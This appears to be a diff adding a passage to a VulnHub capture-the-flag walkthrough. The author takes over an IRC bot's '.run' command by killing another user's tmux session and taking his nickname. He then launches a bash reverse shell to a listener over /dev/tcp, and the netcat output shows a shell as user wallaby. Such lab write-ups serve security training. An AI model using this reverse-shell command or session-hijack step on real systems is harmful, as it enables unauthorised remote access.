@@ -361,6 +361,45 @@ def run(bot, trigger):
           bot.say('Hold on, you aren\'t Waldo?')
 ```
 
+as it shows here we can use `.run` to execute an os command so tried it with my my user as `K3rnel` in hexchat :
+
+![hexchat4](https://github.com/Git-K3rnel/VulnHub/assets/127470407/5b29858a-a18a-40a8-bfec-6c2cc423b817)
+
+it needs user waldo to run the os commands, so it terminated the waldo tmux session and changed my nickname to waldo :
+
+```text
+tmux kill-session -t irssi
+```
+
+i used `/nick waldo` to change my nickname and tried to use `.run` command :
+
+![hexchat5](https://github.com/Git-K3rnel/VulnHub/assets/127470407/c15a79c5-d6c5-46ef-8637-ede796e34895)
+
+yes, finally we can run another reverse shell from here :
+
+```text
+.run bash -c "bash -i >& /dev/tcp/192.168.127.128/4444 0>&1"
+```
+
+and we get a shell :
+
+```text
+root@kali: nc -nvlp 4444
+
+listening on [any] 4444 ...
+connect to [192.168.127.128] from (UNKNOWN) [192.168.127.233] 41266
+bash: cannot set terminal process group (750): Inappropriate ioctl for device
+bash: no job control in this shell
+wallaby@ubuntu:~$ id
+id
+uid=1001(wallaby) gid=1001(wallaby) groups=1001(wallaby),4(adm)
+```
+
+
+
+
+
+
 
 
 
